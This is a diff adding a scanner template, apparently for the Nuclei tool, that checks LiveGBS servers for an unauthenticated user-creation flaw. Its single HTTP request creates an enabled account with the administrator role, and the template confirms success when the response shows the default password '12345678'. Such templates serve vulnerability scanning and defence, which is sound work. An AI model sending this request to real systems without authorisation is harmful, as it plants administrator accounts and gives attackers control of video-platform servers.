@@ -1,0 +1,29 @@
+id: poc-yaml-livegbs-user-save-created-by-any-user
+info:
+  name: LiveGBS User Save Arbitrary User Creation Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+
+variables:
+  t1: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        GET /api/v1/user/save?ID=&Username={{t1}}&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"DefaultUserPassword\": \"12345678\""
+          - "\"ID\""
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
